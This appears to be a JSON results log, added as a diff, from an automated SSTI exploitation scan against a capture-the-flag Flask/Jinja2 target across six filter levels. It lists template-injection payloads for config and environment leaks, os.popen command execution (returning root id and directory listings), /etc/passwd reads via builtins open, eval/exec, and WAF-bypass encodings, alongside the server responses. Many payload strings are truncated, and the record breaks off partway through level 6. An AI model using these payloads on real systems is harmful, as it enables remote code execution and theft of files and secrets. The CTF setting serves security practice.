@@ -1,0 +1,2203 @@
+{
+  "target": "http://ssti.ctfstu.uk:1685",
+  "timestamp": "2026-07-25T02:03:18.139250",
+  "results": [
+    {
+      "level": 1,
+      "filter_info": "无过滤 - 基础 SSTI 可达",
+      "probe": {
+        "{{7*7}}": {
+          "response": "Hello 49",
+          "class": "SHORT"
+        },
+        "{{7*'7'}}": {
+          "response": "Hello 7777777",
+          "class": "DATA"
+        },
+        "{{config}}": {
+          "response": "Hello &lt;Config {&#39;ENV&#39;: &#39;production&#39;, &#39;DEBUG&#39;: False, &#39;TESTING&#39;: Fa",
+          "class": "ERROR"
+        },
+        "{{self}}": {
+          "response": "Hello &lt;TemplateReference None&gt;",
+          "class": "DATA"
+        },
+        "{{request}}": {
+          "response": "Hello &lt;Request &#39;http://127.0.0.1:5000/level/1&#39; [POST]&gt;",
+          "class": "DATA"
+        },
+        "{{''.__class__}}": {
+          "response": "Hello &lt;class &#39;str&#39;&gt;",
+          "class": "DATA"
+        },
+        "{{()|attr('__class__')}}": {
+          "response": "Hello &lt;class &#39;tuple&#39;&gt;",
+          "class": "DATA"
+        }
+      },
+      "config_leak": [
+        {
+          "payload": "{{config}}",
+          "response": "Hello &lt;Config {&#39;ENV&#39;: &#39;production&#39;, &#39;DEBUG&#39;: False, &#39;TESTING&#39;: False, &#39;PROPAGATE_",
+          "class": "ERROR"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__['os'].environ}}",
+          "response": "Hello environ({&#39;HOSTNAME&#39;: &#39;14e9a7d67649&#39;, &#39;SHLVL&#39;: &#39;2&#39;, &#39;HOME&#39;: &#39;/root&#39;",
+          "class": "DATA"
+        },
+        {
+          "payload": "{{url_for.__globals__['current_app'].config}}",
+          "response": "Hello &lt;Config {&#39;ENV&#39;: &#39;production&#39;, &#39;DEBUG&#39;: False, &#39;TESTING&#39;: False, &#39;PROPAGATE_",
+          "class": "ERROR"
+        }
+      ],
+      "rce": [
+        {
+          "payload": "{{''.__class__.__mro__[2].__subclasses__()}}",
+          "response": "No this level",
+          "class": "BLOCKED"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"os\"].popen(\"id\").re",
+          "response": "Hello uid=0(root) gid=0(root) groups=0(root)",
+          "class": "DATA"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"os\"].popen(\"ls\").re",
+          "response": "Hello bin\nboot\ndev\netc\nflag\nget-pip.py\nhome\nlib\nlib64\nmedia\nmnt\nopt\nproc\nroot\nrun\nsbin\nshell.php\nsrv\nstorage.txt\nsys\ntmp",
+          "class": "DATA"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"os\"].popen(\"whoami\"",
+          "response": "Hello root",
+          "class": "SHORT"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"os\"].popen(\"cat /et",
+          "response": "Hello root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nolog",
+          "class": "DATA"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"__builtins__\"][\"__i",
+          "response": "Hello uid=0(root) gid=0(root) groups=0(root)",
+          "class": "DATA"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"__builtins__\"][\"eva",
+          "response": "Hello uid=0(root) gid=0(root) groups=0(root)",
+          "class": "DATA"
+        }
+      ],
+      "file_read": [
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"os\"].popen(\"cat /et",
+          "response": "Hello root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nolog",
+          "class": "DATA"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"__builtins__\"][\"ope",
+          "response": "Hello root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nolog",
+          "class": "DATA"
+        },
+        {
+          "payload": "{{get_flashed_messages.__globals__[\"__builtins__\"][\"open\"](\"",
+          "response": "Hello root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nolog",
+          "class": "DATA"
+        },
+        {
+          "payload": "{{lipsum.__globals__[\"__builtins__\"][\"open\"](\"/etc/passwd\").",
+          "response": "Hello root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nolog",
+          "class": "DATA"
+        },
+        {
+          "payload": "{{url_for.__globals__[\"__builtins__\"][\"open\"](\"/etc/passwd\")",
+          "response": "Hello root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nolog",
+          "class": "DATA"
+        }
+      ],
+      "eval": [
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"__builtins__\"][\"eva",
+          "response": "Hello uid=0(root) gid=0(root) groups=0(root)",
+          "class": "DATA"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"__builtins__\"][\"eva",
+          "response": "Hello 2",
+          "class": "SHORT"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"__builtins__\"][\"eva",
+          "response": "Hello 14e9a7d67649",
+          "class": "DATA"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"__builtins__\"][\"exe",
+          "response": "Hello None",
+          "class": "SHORT"
+        }
+      ],
+      "bypass": [
+        {
+          "payload": "{{()|attr(\"__class__\")|attr(\"__base__\")|attr(\"__subclasses__",
+          "response": "Hello [&lt;class &#39;type&#39;&gt;, &lt;class &#39;weakref&#39;&gt;, &lt;class &#39;weakcallableproxy&#39;&gt;, &lt;cla",
+          "class": "ERROR"
+        },
+        {
+          "payload": "{{()|attr(\"\\x5f\\x5fclass\\x5f\\x5f\")|attr(\"\\x5f\\x5fmro\\x5f\\x5f",
+          "response": "No this level",
+          "class": "BLOCKED"
+        },
+        {
+          "payload": "{{request|attr(\"application\")|attr(\"\\x5f\\x5fglobals\\x5f\\x5f\"",
+          "response": "No this level",
+          "class": "BLOCKED"
+        },
+        {
+          "payload": "{{\"\"[\"__class__\"][\"__mro__\"][2][\"__subclasses__\"]()}}",
+          "response": "No this level",
+          "class": "BLOCKED"
+        },
+        {
+          "payload": "{{config[\"__class__\"][\"__init__\"][\"__globals__\"][\"os\"][\"pope",
+          "response": "Hello uid=0(root) gid=0(root) groups=0(root)",
+          "class": "DATA"
+        }
+      ],
+      "vulnerable": true,
+      "has_rce": true,
+      "has_file_read": true,
+      "has_eval": true,
+      "has_config_leak": true
+    },
+    {
+      "level": 2,
+      "filter_info": "WAF 严格过滤 - 几乎全部拦截",
+      "probe": {
+        "{{7*7}}": {
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        "{{7*'7'}}": {
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        "{{config}}": {
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        "{{self}}": {
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        "{{request}}": {
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        "{{''.__class__}}": {
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        "{{()|attr('__class__')}}": {
+          "response": "Hello WAF",
+          "class": "WAF"
+        }
+      },
+      "config_leak": [
+        {
+          "payload": "{{config}}",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__['os'].environ}}",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{url_for.__globals__['current_app'].config}}",
+          "response": "Hello WAF",
+          "class": "WAF"
+        }
+      ],
+      "rce": [
+        {
+          "payload": "{{''.__class__.__mro__[2].__subclasses__()}}",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"os\"].popen(\"id\").re",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"os\"].popen(\"ls\").re",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"os\"].popen(\"whoami\"",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"os\"].popen(\"cat /et",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"__builtins__\"][\"__i",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"__builtins__\"][\"eva",
+          "response": "Hello WAF",
+          "class": "WAF"
+        }
+      ],
+      "file_read": [
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"os\"].popen(\"cat /et",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"__builtins__\"][\"ope",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{get_flashed_messages.__globals__[\"__builtins__\"][\"open\"](\"",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{lipsum.__globals__[\"__builtins__\"][\"open\"](\"/etc/passwd\").",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{url_for.__globals__[\"__builtins__\"][\"open\"](\"/etc/passwd\")",
+          "response": "Hello WAF",
+          "class": "WAF"
+        }
+      ],
+      "eval": [
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"__builtins__\"][\"eva",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"__builtins__\"][\"eva",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"__builtins__\"][\"eva",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"__builtins__\"][\"exe",
+          "response": "Hello WAF",
+          "class": "WAF"
+        }
+      ],
+      "bypass": [
+        {
+          "payload": "{{()|attr(\"__class__\")|attr(\"__base__\")|attr(\"__subclasses__",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{()|attr(\"\\x5f\\x5fclass\\x5f\\x5f\")|attr(\"\\x5f\\x5fmro\\x5f\\x5f",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{request|attr(\"application\")|attr(\"\\x5f\\x5fglobals\\x5f\\x5f\"",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{\"\"[\"__class__\"][\"__mro__\"][2][\"__subclasses__\"]()}}",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{config[\"__class__\"][\"__init__\"][\"__globals__\"][\"os\"][\"pope",
+          "response": "Hello WAF",
+          "class": "WAF"
+        }
+      ],
+      "vulnerable": false,
+      "has_rce": false,
+      "has_file_read": false,
+      "has_eval": false,
+      "has_config_leak": false
+    },
+    {
+      "level": 3,
+      "filter_info": "必须返回 'correct' - 猜测使用 {% %} 块语句",
+      "probe": {
+        "{{7*7}}": {
+          "response": "Hello correct",
+          "class": "CORRECT"
+        },
+        "{{7*'7'}}": {
+          "response": "Hello correct",
+          "class": "CORRECT"
+        },
+        "{{config}}": {
+          "response": "Hello correct",
+          "class": "CORRECT"
+        },
+        "{{self}}": {
+          "response": "Hello correct",
+          "class": "CORRECT"
+        },
+        "{{request}}": {
+          "response": "Hello correct",
+          "class": "CORRECT"
+        },
+        "{{''.__class__}}": {
+          "response": "Hello correct",
+          "class": "CORRECT"
+        },
+        "{{()|attr('__class__')}}": {
+          "response": "Hello correct",
+          "class": "CORRECT"
+        }
+      },
+      "config_leak": [
+        {
+          "payload": "{{config}}",
+          "response": "Hello correct",
+          "class": "CORRECT"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__['os'].environ}}",
+          "response": "Hello correct",
+          "class": "CORRECT"
+        },
+        {
+          "payload": "{{url_for.__globals__['current_app'].config}}",
+          "response": "Hello correct",
+          "class": "CORRECT"
+        }
+      ],
+      "rce": [
+        {
+          "payload": "{{''.__class__.__mro__[2].__subclasses__()}}",
+          "response": "Hello wrong",
+          "class": "WRONG"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"os\"].popen(\"id\").re",
+          "response": "Hello correct",
+          "class": "CORRECT"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"os\"].popen(\"ls\").re",
+          "response": "Hello correct",
+          "class": "CORRECT"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"os\"].popen(\"whoami\"",
+          "response": "Hello correct",
+          "class": "CORRECT"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"os\"].popen(\"cat /et",
+          "response": "Hello correct",
+          "class": "CORRECT"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"__builtins__\"][\"__i",
+          "response": "Hello correct",
+          "class": "CORRECT"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"__builtins__\"][\"eva",
+          "response": "Hello correct",
+          "class": "CORRECT"
+        }
+      ],
+      "file_read": [
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"os\"].popen(\"cat /et",
+          "response": "Hello correct",
+          "class": "CORRECT"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"__builtins__\"][\"ope",
+          "response": "Hello correct",
+          "class": "CORRECT"
+        },
+        {
+          "payload": "{{get_flashed_messages.__globals__[\"__builtins__\"][\"open\"](\"",
+          "response": "Hello correct",
+          "class": "CORRECT"
+        },
+        {
+          "payload": "{{lipsum.__globals__[\"__builtins__\"][\"open\"](\"/etc/passwd\").",
+          "response": "Hello correct",
+          "class": "CORRECT"
+        },
+        {
+          "payload": "{{url_for.__globals__[\"__builtins__\"][\"open\"](\"/etc/passwd\")",
+          "response": "Hello correct",
+          "class": "CORRECT"
+        }
+      ],
+      "eval": [
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"__builtins__\"][\"eva",
+          "response": "Hello correct",
+          "class": "CORRECT"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"__builtins__\"][\"eva",
+          "response": "Hello correct",
+          "class": "CORRECT"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"__builtins__\"][\"eva",
+          "response": "Hello correct",
+          "class": "CORRECT"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"__builtins__\"][\"exe",
+          "response": "Hello correct",
+          "class": "CORRECT"
+        }
+      ],
+      "bypass": [
+        {
+          "payload": "{{()|attr(\"__class__\")|attr(\"__base__\")|attr(\"__subclasses__",
+          "response": "Hello correct",
+          "class": "CORRECT"
+        },
+        {
+          "payload": "{{()|attr(\"\\x5f\\x5fclass\\x5f\\x5f\")|attr(\"\\x5f\\x5fmro\\x5f\\x5f",
+          "response": "Hello wrong",
+          "class": "WRONG"
+        },
+        {
+          "payload": "{{request|attr(\"application\")|attr(\"\\x5f\\x5fglobals\\x5f\\x5f\"",
+          "response": "Hello wrong",
+          "class": "WRONG"
+        },
+        {
+          "payload": "{{\"\"[\"__class__\"][\"__mro__\"][2][\"__subclasses__\"]()}}",
+          "response": "Hello wrong",
+          "class": "WRONG"
+        },
+        {
+          "payload": "{{config[\"__class__\"][\"__init__\"][\"__globals__\"][\"os\"][\"pope",
+          "response": "Hello correct",
+          "class": "CORRECT"
+        }
+      ],
+      "vulnerable": false,
+      "has_rce": false,
+      "has_file_read": false,
+      "has_eval": false,
+      "has_config_leak": false
+    },
+    {
+      "level": 4,
+      "filter_info": "过滤 .__class__ - 但可用 {{config}} {{request}}",
+      "probe": {
+        "{{7*7}}": {
+          "response": "Hello 49",
+          "class": "SHORT"
+        },
+        "{{7*'7'}}": {
+          "response": "Hello 7777777",
+          "class": "DATA"
+        },
+        "{{config}}": {
+          "response": "Hello &lt;Config {&#39;ENV&#39;: &#39;production&#39;, &#39;DEBUG&#39;: False, &#39;TESTING&#39;: Fa",
+          "class": "ERROR"
+        },
+        "{{self}}": {
+          "response": "Hello &lt;TemplateReference None&gt;",
+          "class": "DATA"
+        },
+        "{{request}}": {
+          "response": "Hello &lt;Request &#39;http://127.0.0.1:5000/level/4&#39; [POST]&gt;",
+          "class": "DATA"
+        },
+        "{{''.__class__}}": {
+          "response": "Hello &lt;class &#39;str&#39;&gt;",
+          "class": "DATA"
+        },
+        "{{()|attr('__class__')}}": {
+          "response": "Hello &lt;class &#39;tuple&#39;&gt;",
+          "class": "DATA"
+        }
+      },
+      "config_leak": [
+        {
+          "payload": "{{config}}",
+          "response": "Hello &lt;Config {&#39;ENV&#39;: &#39;production&#39;, &#39;DEBUG&#39;: False, &#39;TESTING&#39;: False, &#39;PROPAGATE_",
+          "class": "ERROR"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__['os'].environ}}",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{url_for.__globals__['current_app'].config}}",
+          "response": "Hello WAF",
+          "class": "WAF"
+        }
+      ],
+      "rce": [
+        {
+          "payload": "{{''.__class__.__mro__[2].__subclasses__()}}",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"os\"].popen(\"id\").re",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"os\"].popen(\"ls\").re",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"os\"].popen(\"whoami\"",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"os\"].popen(\"cat /et",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"__builtins__\"][\"__i",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"__builtins__\"][\"eva",
+          "response": "Hello WAF",
+          "class": "WAF"
+        }
+      ],
+      "file_read": [
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"os\"].popen(\"cat /et",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"__builtins__\"][\"ope",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{get_flashed_messages.__globals__[\"__builtins__\"][\"open\"](\"",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{lipsum.__globals__[\"__builtins__\"][\"open\"](\"/etc/passwd\").",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{url_for.__globals__[\"__builtins__\"][\"open\"](\"/etc/passwd\")",
+          "response": "Hello WAF",
+          "class": "WAF"
+        }
+      ],
+      "eval": [
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"__builtins__\"][\"eva",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"__builtins__\"][\"eva",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"__builtins__\"][\"eva",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"__builtins__\"][\"exe",
+          "response": "Hello WAF",
+          "class": "WAF"
+        }
+      ],
+      "bypass": [
+        {
+          "payload": "{{()|attr(\"__class__\")|attr(\"__base__\")|attr(\"__subclasses__",
+          "response": "Hello [&lt;class &#39;type&#39;&gt;, &lt;class &#39;weakref&#39;&gt;, &lt;class &#39;weakcallableproxy&#39;&gt;, &lt;cla",
+          "class": "ERROR"
+        },
+        {
+          "payload": "{{()|attr(\"\\x5f\\x5fclass\\x5f\\x5f\")|attr(\"\\x5f\\x5fmro\\x5f\\x5f",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{request|attr(\"application\")|attr(\"\\x5f\\x5fglobals\\x5f\\x5f\"",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{\"\"[\"__class__\"][\"__mro__\"][2][\"__subclasses__\"]()}}",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{config[\"__class__\"][\"__init__\"][\"__globals__\"][\"os\"][\"pope",
+          "response": "Hello WAF",
+          "class": "WAF"
+        }
+      ],
+      "vulnerable": false,
+      "has_rce": false,
+      "has_file_read": false,
+      "has_eval": false,
+      "has_config_leak": false
+    },
+    {
+      "level": 5,
+      "filter_info": "过滤 .__class__ - 与 4 类似",
+      "probe": {
+        "{{7*7}}": {
+          "response": "Hello 49",
+          "class": "SHORT"
+        },
+        "{{7*'7'}}": {
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        "{{config}}": {
+          "response": "Hello &lt;Config {&#39;ENV&#39;: &#39;production&#39;, &#39;DEBUG&#39;: False, &#39;TESTING&#39;: Fa",
+          "class": "ERROR"
+        },
+        "{{self}}": {
+          "response": "Hello &lt;TemplateReference None&gt;",
+          "class": "DATA"
+        },
+        "{{request}}": {
+          "response": "Hello &lt;Request &#39;http://127.0.0.1:5000/level/5&#39; [POST]&gt;",
+          "class": "DATA"
+        },
+        "{{''.__class__}}": {
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        "{{()|attr('__class__')}}": {
+          "response": "Hello WAF",
+          "class": "WAF"
+        }
+      },
+      "config_leak": [
+        {
+          "payload": "{{config}}",
+          "response": "Hello &lt;Config {&#39;ENV&#39;: &#39;production&#39;, &#39;DEBUG&#39;: False, &#39;TESTING&#39;: False, &#39;PROPAGATE_",
+          "class": "ERROR"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__['os'].environ}}",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{url_for.__globals__['current_app'].config}}",
+          "response": "Hello WAF",
+          "class": "WAF"
+        }
+      ],
+      "rce": [
+        {
+          "payload": "{{''.__class__.__mro__[2].__subclasses__()}}",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"os\"].popen(\"id\").re",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"os\"].popen(\"ls\").re",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"os\"].popen(\"whoami\"",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"os\"].popen(\"cat /et",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"__builtins__\"][\"__i",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"__builtins__\"][\"eva",
+          "response": "Hello WAF",
+          "class": "WAF"
+        }
+      ],
+      "file_read": [
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"os\"].popen(\"cat /et",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"__builtins__\"][\"ope",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{get_flashed_messages.__globals__[\"__builtins__\"][\"open\"](\"",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{lipsum.__globals__[\"__builtins__\"][\"open\"](\"/etc/passwd\").",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{url_for.__globals__[\"__builtins__\"][\"open\"](\"/etc/passwd\")",
+          "response": "Hello WAF",
+          "class": "WAF"
+        }
+      ],
+      "eval": [
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"__builtins__\"][\"eva",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"__builtins__\"][\"eva",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"__builtins__\"][\"eva",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"__builtins__\"][\"exe",
+          "response": "Hello WAF",
+          "class": "WAF"
+        }
+      ],
+      "bypass": [
+        {
+          "payload": "{{()|attr(\"__class__\")|attr(\"__base__\")|attr(\"__subclasses__",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{()|attr(\"\\x5f\\x5fclass\\x5f\\x5f\")|attr(\"\\x5f\\x5fmro\\x5f\\x5f",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{request|attr(\"application\")|attr(\"\\x5f\\x5fglobals\\x5f\\x5f\"",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{\"\"[\"__class__\"][\"__mro__\"][2][\"__subclasses__\"]()}}",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{config[\"__class__\"][\"__init__\"][\"__globals__\"][\"os\"][\"pope",
+          "response": "Hello WAF",
+          "class": "WAF"
+        }
+      ],
+      "vulnerable": false,
+      "has_rce": false,
+      "has_file_read": false,
+      "has_eval": false,
+      "has_config_leak": false
+    },
+    {
+      "level": 6,
+      "filter_info": "过滤 .__class__ + '2' - 部分 WAF",
+      "probe": {
+        "{{7*7}}": {
+          "response": "Hello 49",
+          "class": "SHORT"
+        },
+        "{{7*'7'}}": {
+          "response": "Hello 7777777",
+          "class": "DATA"
+        },
+        "{{config}}": {
+          "response": "Hello &lt;Config {&#39;ENV&#39;: &#39;production&#39;, &#39;DEBUG&#39;: False, &#39;TESTING&#39;: Fa",
+          "class": "ERROR"
+        },
+        "{{self}}": {
+          "response": "Hello &lt;TemplateReference None&gt;",
+          "class": "DATA"
+        },
+        "{{request}}": {
+          "response": "Hello &lt;Request &#39;http://127.0.0.1:5000/level/6&#39; [POST]&gt;",
+          "class": "DATA"
+        },
+        "{{''.__class__}}": {
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        "{{()|attr('__class__')}}": {
+          "response": "Hello WAF",
+          "class": "WAF"
+        }
+      },
+      "config_leak": [
+        {
+          "payload": "{{config}}",
+          "response": "Hello &lt;Config {&#39;ENV&#39;: &#39;production&#39;, &#39;DEBUG&#39;: False, &#39;TESTING&#39;: False, &#39;PROPAGATE_",
+          "class": "ERROR"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__['os'].environ}}",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{url_for.__globals__['current_app'].config}}",
+          "response": "Hello WAF",
+          "class": "WAF"
+        }
+      ],
+      "rce": [
+        {
+          "payload": "{{''.__class__.__mro__[2].__subclasses__()}}",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"os\"].popen(\"id\").re",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"os\"].popen(\"ls\").re",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"os\"].popen(\"whoami\"",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"os\"].popen(\"cat /et",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"__builtins__\"][\"__i",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"__builtins__\"][\"eva",
+          "response": "Hello WAF",
+          "class": "WAF"
+        }
+      ],
+      "file_read": [
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"os\"].popen(\"cat /et",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"__builtins__\"][\"ope",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{get_flashed_messages.__globals__[\"__builtins__\"][\"open\"](\"",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{lipsum.__globals__[\"__builtins__\"][\"open\"](\"/etc/passwd\").",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{url_for.__globals__[\"__builtins__\"][\"open\"](\"/etc/passwd\")",
+          "response": "Hello WAF",
+          "class": "WAF"
+        }
+      ],
+      "eval": [
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"__builtins__\"][\"eva",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"__builtins__\"][\"eva",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"__builtins__\"][\"eva",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"__builtins__\"][\"exe",
+          "response": "Hello WAF",
+          "class": "WAF"
+        }
+      ],
